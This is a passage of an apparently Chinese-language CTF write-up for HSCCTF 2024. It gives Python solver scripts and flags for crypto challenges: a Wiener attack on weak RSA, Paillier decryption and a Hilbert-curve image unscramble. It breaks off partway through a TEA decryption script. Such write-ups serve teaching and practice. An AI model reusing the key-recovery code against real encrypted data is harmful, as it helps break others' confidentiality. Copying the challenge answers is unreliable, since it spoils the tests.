class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">x = [(n-k)%n <span class="keyword">for</span> k <span class="keyword">in</span> v]</span><br><span class="line">res = add(w,mul(s,x,n,mod),n,mod)</span><br><span class="line"></span><br><span class="line">t1 = (res//(<span class="number">2</span>**<span class="number">30</span>))[:<span class="number">76</span>]</span><br><span class="line">t2 = (res%(<span class="number">2</span>**<span class="number">30</span>))[:<span class="number">76</span>]</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t1)):</span><br><span class="line">    <span class="keyword">if</span> t2[i] &gt; <span class="number">1000000</span>:</span><br><span class="line">        c += <span class="built_in">chr</span>(t1[i]+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        c += <span class="built_in">chr</span>(t1[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(c,<span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;HSCCTF&#123;vb6fh8gd7fy87jht7fgyt7g89gb9dn&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="RSATEST"><a href="#RSATEST" class="headerlink" title="RSATEST"></a>RSATEST</h3><p>给了公钥文件和密文，在线解析公钥得到 $n,e$，wiener attack求 $d$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rational_to_contfrac</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="comment"># Converts a rational x/y fraction into a list of partial quotients [a0, ..., an]</span></span><br><span class="line">    a = x // y</span><br><span class="line">    pquotients = [a]</span><br><span class="line">    <span class="keyword">while</span> a * y != x:</span><br><span class="line">        x, y = y, x - a * y</span><br><span class="line">        a = x // y</span><br><span class="line">        pquotients.append(a)</span><br><span class="line">    <span class="keyword">return</span> pquotients</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convergents_from_contfrac</span>(<span class="params">frac</span>):</span><br><span class="line">    <span class="comment"># computes the list of convergents using the list of partial quotients</span></span><br><span class="line">    convs = [];</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(frac)): convs.append(contfrac_to_rational(frac[<span class="number">0</span> : i]))</span><br><span class="line">    <span class="keyword">return</span> convs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contfrac_to_rational</span> (frac):</span><br><span class="line">    <span class="comment"># Converts a finite continued fraction [a0, ..., an] to an x/y rational.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(frac) == <span class="number">0</span>: <span class="keyword">return</span> (<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    num = frac[-<span class="number">1</span>]</span><br><span class="line">    denom = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">2</span>, -<span class="built_in">len</span>(frac) - <span class="number">1</span>, -<span class="number">1</span>): num, denom = frac[_] * num + denom, num</span><br><span class="line">    <span class="keyword">return</span> (num, denom)</span><br><span class="line"></span><br><span class="line">e = <span class="number">28590331496425613818981991777617535857151582651120346436859967760844419275658771430821058722393674433618893115968176611013590439492663850993790177381059077045197086133940118402088554088073121591402095323966107722485647643452801806511583327361664114727935171402256611877627071996643841223356362367747555753013</span></span><br><span class="line">n = <span class="number">82016816963574560365976489524199243050120748716806912567895093731022264392235286524041630435256965141365061465268083316572087612155218061280174438822024011254230300135794845491207820824129566975766207833561478897150955561714805950254000266078855648956964973181825856857736088834707915779351726709234357344729</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>: <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    g, x, y = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, y - (b // a) * x, x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, _ = egcd(a, m)</span><br><span class="line">    <span class="keyword">return</span> (x + m) % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isqrt</span>(<span class="params">n</span>):</span><br><span class="line">    x = n</span><br><span class="line">    y = (x + <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> y &lt; x:</span><br><span class="line">        x = y</span><br><span class="line">        y = (x + n // x) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_rsa</span>(<span class="params">e, n</span>):</span><br><span class="line">    frac = rational_to_contfrac(e, n)</span><br><span class="line">    convergents = convergents_from_contfrac(frac)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># check if x*x - s*x + n = 0 has integer roots</span></span><br><span class="line">            D = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> D &gt;= <span class="number">0</span>:</span><br><span class="line">                sq = isqrt(D)</span><br><span class="line">                <span class="keyword">if</span> sq * sq == D <span class="keyword">and</span> (s + sq) % <span class="number">2</span> == <span class="number">0</span>: <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">d = crack_rsa(e, n)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11883451304899715537</span></span><br></pre></td></tr></table></figure><p>根据 $n,e,d$ 分解 $p,q$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">divide_pq</span>(<span class="params">e, d, n</span>):</span><br><span class="line">    k = e*d - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        g = random.randint(<span class="number">2</span>, n-<span class="number">1</span>)</span><br><span class="line">        t = k</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> t % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            t //= <span class="number">2</span></span><br><span class="line">            x = <span class="built_in">pow</span>(g, t, n)</span><br><span class="line">            <span class="keyword">if</span> x &gt; <span class="number">1</span> <span class="keyword">and</span> gmpy2.gcd(x-<span class="number">1</span>, n) &gt; <span class="number">1</span>:</span><br><span class="line">                p = gmpy2.gcd(x-<span class="number">1</span>, n)</span><br><span class="line">                <span class="keyword">return</span> (p, n//p)</span><br><span class="line">            </span><br><span class="line">e = <span class="number">28590331496425613818981991777617535857151582651120346436859967760844419275658771430821058722393674433618893115968176611013590439492663850993790177381059077045197086133940118402088554088073121591402095323966107722485647643452801806511583327361664114727935171402256611877627071996643841223356362367747555753013</span></span><br><span class="line">n = <span class="number">82016816963574560365976489524199243050120748716806912567895093731022264392235286524041630435256965141365061465268083316572087612155218061280174438822024011254230300135794845491207820824129566975766207833561478897150955561714805950254000266078855648956964973181825856857736088834707915779351726709234357344729</span></span><br><span class="line">c = <span class="number">0x1d1d98935d8bc395049b978b53ab72fc2c722f30b84bbf6c2bf3473320d040525bce59094840b229cf1fee0332c9dbcfc9cc07bf0841d2ec5f25b3f6a2868db433aca742d1e17a7b89f94412a77ea2f0ee3c30b53e250f77c44fd0e9c47bdfbfaa6dfe3f987409e9e6501962bf425cb686b570f922b843e30b4e96521c2dd296</span></span><br><span class="line">d=<span class="number">11883451304899715537</span></span><br><span class="line">p, q = divide_pq(e, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;q = <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = 8281403040977025531549820722276265064745565654568438822912387430707467937623490534629221470348100185977195507167386055422519226694536400000080279834237671</span></span><br><span class="line"><span class="comment"># q = 9903734494958037799680839753815171083006157728210189116724935884147895459864893196164405513869856559603118560765385175174916229249053756596318108626734399</span></span><br></pre></td></tr></table></figure><p>生成私钥文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">e=<span class="number">28590331496425613818981991777617535857151582651120346436859967760844419275658771430821058722393674433618893115968176611013590439492663850993790177381059077045197086133940118402088554088073121591402095323966107722485647643452801806511583327361664114727935171402256611877627071996643841223356362367747555753013</span></span><br><span class="line">n=<span class="number">82016816963574560365976489524199243050120748716806912567895093731022264392235286524041630435256965141365061465268083316572087612155218061280174438822024011254230300135794845491207820824129566975766207833561478897150955561714805950254000266078855648956964973181825856857736088834707915779351726709234357344729</span></span><br><span class="line">c=<span class="number">0x1d1d98935d8bc395049b978b53ab72fc2c722f30b84bbf6c2bf3473320d040525bce59094840b229cf1fee0332c9dbcfc9cc07bf0841d2ec5f25b3f6a2868db433aca742d1e17a7b89f94412a77ea2f0ee3c30b53e250f77c44fd0e9c47bdfbfaa6dfe3f987409e9e6501962bf425cb686b570f922b843e30b4e96521c2dd296</span></span><br><span class="line">d=<span class="number">11883451304899715537</span></span><br><span class="line">p = <span class="number">8281403040977025531549820722276265064745565654568438822912387430707467937623490534629221470348100185977195507167386055422519226694536400000080279834237671</span></span><br><span class="line">q = <span class="number">9903734494958037799680839753815171083006157728210189116724935884147895459864893196164405513869856559603118560765385175174916229249053756596318108626734399</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rsa_components = (n, e, d, p, q)</span><br><span class="line">myrsa = RSA.construct(rsa_components)</span><br><span class="line"></span><br><span class="line">private = <span class="built_in">open</span>(<span class="string">&#x27;private.pem&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">private.write(myrsa.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure><p>openssl解密：</p><p><code>openssl rsautl -decrypt -inkey private.pem -in output.txt</code></p><p>输出：<code>09C96E1A3ACC46E3C9F7603EB592FE4A</code></p><p>flag：<code>HSCCTF&#123;09C96E1A3ACC46E3C9F7603EB592FE4A&#125;</code></p><p>​</p><h3 id="STAR-CHASING-DIARY"><a href="#STAR-CHASING-DIARY" class="headerlink" title="STAR_CHASING_DIARY"></a>STAR_CHASING_DIARY</h3><blockquote><p>crypto!图片?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># key.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q =&quot;</span>, q)</span><br><span class="line">n = p * q</span><br><span class="line">key = <span class="string">&#x27;********************&#x27;</span></span><br><span class="line">m = bytes_to_long(key.encode())</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &lt; <span class="number">300</span></span><br><span class="line">r = randint(<span class="number">1</span>, n)</span><br><span class="line">c = (<span class="built_in">pow</span>(n + <span class="number">1</span>, m, n * n) * <span class="built_in">pow</span>(r, n, n * n)) % (n * n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = 7828612943367317778189697443061863547768704021648982642807960201410438190347546379219450386530108335470584219657007036386835647156694512102467911388214639</span></span><br><span class="line"><span class="comment"># q = 11560196429251786803557082533869761370530605728500211999842201987445533038949033226473164866960007192683170489064961432891988337343103657552186800680461299</span></span><br><span class="line"><span class="comment"># c = 768905250861905487717845092484035532140840941871031779930259407348955511757335716790249355464829607714399266689960353955065504221985891074636544161678177920296971444880997864168042745264256952808480926755620637239135808617643874771066244234690401223758004286234917537720362007827248701308605961814972773704288547887039586934111562590676930853945316673164146667949991176600280451163710564978897622310650541491271961315592017251211248379608602287809736613530069187936569470129814949302440734244885473716072898519354127964155042421376782226235081303957997587618278341829891036314980185040102049478608445519994654780162</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># task.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">小肖在学习的过程中,了解到了一种填充图片的算法,兴奋的她用它和RSA加密了偶像的照片,</span></span><br><span class="line"><span class="string">但是在传输的过程中丢失了一部分加密算法,你能帮她补全,并解出来偶像的照片吗?</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">n, x, y</span>):</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    m = <span class="number">1</span> &lt;&lt; (n - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">j = <span class="number">128</span></span><br><span class="line">mm = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">257</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">257</span>):</span><br><span class="line">        mm.append(f(j, i, s) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag.jpg&#x27;</span>)</span><br><span class="line">pixels = <span class="built_in">list</span>(img.getdata())</span><br><span class="line">data = [pixel <span class="keyword">for</span> pixel <span class="keyword">in</span> pixels]</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;key.png&#x27;</span>)</span><br><span class="line">pixels = <span class="built_in">list</span>(img.getdata())</span><br><span class="line">png_key = [pixel <span class="keyword">for</span> pixel <span class="keyword">in</span> pixels]</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">0</span>] * <span class="number">65536</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    enc[i] = data[mm[i]]</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    enc[s] = enc[s] ^ png_key[s]</span><br><span class="line"></span><br><span class="line">image = Image.new(<span class="string">&#x27;L&#x27;</span>, (<span class="number">256</span>, <span class="number">256</span>))</span><br><span class="line">image.putdata(enc)</span><br><span class="line">image.save(<span class="string">&#x27;enc.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure></blockquote><p>先看 key.py，Paillier密码系统：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">7828612943367317778189697443061863547768704021648982642807960201410438190347546379219450386530108335470584219657007036386835647156694512102467911388214639</span></span><br><span class="line">q = <span class="number">11560196429251786803557082533869761370530605728500211999842201987445533038949033226473164866960007192683170489064961432891988337343103657552186800680461299</span></span><br><span class="line">c = <span class="number">768905250861905487717845092484035532140840941871031779930259407348955511757335716790249355464829607714399266689960353955065504221985891074636544161678177920296971444880997864168042745264256952808480926755620637239135808617643874771066244234690401223758004286234917537720362007827248701308605961814972773704288547887039586934111562590676930853945316673164146667949991176600280451163710564978897622310650541491271961315592017251211248379608602287809736613530069187936569470129814949302440734244885473716072898519354127964155042421376782226235081303957997587618278341829891036314980185040102049478608445519994654780162</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">L</span>(<span class="params">x,n</span>):</span><br><span class="line">    <span class="keyword">return</span> (x-<span class="number">1</span>)//n</span><br><span class="line"></span><br><span class="line">lamb = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">miu = inverse_mod(lamb,n)</span><br><span class="line">m = (L(<span class="built_in">pow</span>(c,lamb,n**<span class="number">2</span>),n)*miu)%n</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;HSCCTF&#123;this_is_a_fake_flag&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>用密码 <code>HSCCTF&#123;this_is_a_fake_flag&#125;</code> 解压得到 key.png。</p><p>再看 task.py，<code>f()</code> 函数不完整，根据提示是一种填充图片的算法，必定遍历0~65535共65536个下标值。</p><p>结合 <code>m = 1 &lt;&lt; (n - 1)</code> 和传入的 $n=128=\frac{256}{2}$，猜测为使用Hilbert曲线遍历 $256 \times 256$ 个值。</p><p>找到<a target="_blank" rel="noopener" href="https://github.com/LynchrocketCourseLearning/2022Spring-CS208-Algorithm_Design_and_Analysis/blob/c9c992501063af9c7849c6eb95274964b719a0a1/lab/8/HilbertCurve.java">Hilbert曲线递归遍历的代码</a>，补充 <code>f()</code> 函数，还原flag.jpg：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">n, x, y</span>):</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    m = <span class="number">1</span> &lt;&lt; (n - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> x &lt;= m:</span><br><span class="line">        <span class="keyword">if</span> y &lt;= m:</span><br><span class="line">            <span class="keyword">return</span> f(n - <span class="number">1</span>, y, x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> m * m + f(n - <span class="number">1</span>, x, y - m)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> y &gt; m:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span> * m * m + f(n - <span class="number">1</span>, x - m, y - m)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">3</span> * m * m + f(n - <span class="number">1</span>, m + <span class="number">1</span> - y, m + <span class="number">1</span> - (x - m))</span><br><span class="line">        </span><br><span class="line">j = <span class="number">128</span></span><br><span class="line">mm = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">257</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">257</span>):</span><br><span class="line">        mm.append(f(j, i, s) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(mm)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;enc.jpg&#x27;</span>)</span><br><span class="line">pixels = <span class="built_in">list</span>(img.getdata())</span><br><span class="line">c = [pixel <span class="keyword">for</span> pixel <span class="keyword">in</span> pixels]</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;key.png&#x27;</span>)</span><br><span class="line">pixels = <span class="built_in">list</span>(img.getdata())</span><br><span class="line">png_key = [pixel <span class="keyword">for</span> pixel <span class="keyword">in</span> pixels]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    c[s] = c[s] ^ png_key[s]</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">65536</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    flag[mm[i]] = c[i]</span><br><span class="line"></span><br><span class="line">image = Image.new(<span class="string">&#x27;L&#x27;</span>, (<span class="number">256</span>, <span class="number">256</span>))</span><br><span class="line">image.putdata(flag)</span><br><span class="line">image.save(<span class="string">&#x27;flag.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到原始图片：</p><p><img src="/2024/03/11/match-HSCCTF-2024/flag.jpg" alt="flag"></p><p>flag：<code>HSCCTF&#123;oh!_you_c_yhhhh&#125;</code>。</p><p>​</p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h3><blockquote><p>将得到的flag改为HSCCTF。</p></blockquote><p>简答TEA加密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = <span class="number">0x9E3779B9</span> * <span class="number">32</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span 